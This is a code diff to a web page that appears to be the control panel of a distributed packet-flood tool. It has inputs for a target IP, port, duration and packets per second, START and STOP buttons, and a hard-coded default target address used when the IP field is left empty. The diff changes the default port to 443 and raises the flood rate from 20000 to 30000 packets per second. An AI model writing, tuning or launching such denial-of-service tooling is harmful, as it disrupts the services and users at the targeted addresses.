@@ -21,10 +21,10 @@
 
 <input id="ip" placeholder="IP（空でも撃てる）">
 <div class="row">
-  <input id="port" placeholder="port" value="9339">
+  <input id="port" placeholder="port" value="443">
   <input id="dur" placeholder="秒" value="300">
 </div>
-<input id="pps" placeholder="合計pps" value="20000">
+<input id="pps" placeholder="合計pps" value="30000">
 <button id="go">START</button>
 <button id="stop" class="stop">STOP</button>
 
@@ -72,7 +72,7 @@ $('go').onclick = async () => {
   if (running) return;
   const ip = $('ip').value.trim() || '52.33.95.61';
   const port = $('port').value, dur = $('dur').value;
-  const per = Math.min(20000, Math.max(1, Math.floor(Number($('pps').value) / NODES.length)));
+  const per = Math.min(30000, Math.max(1, Math.floor(Number($('pps').value) / NODES.length)));
 
   running = true;
   await health();
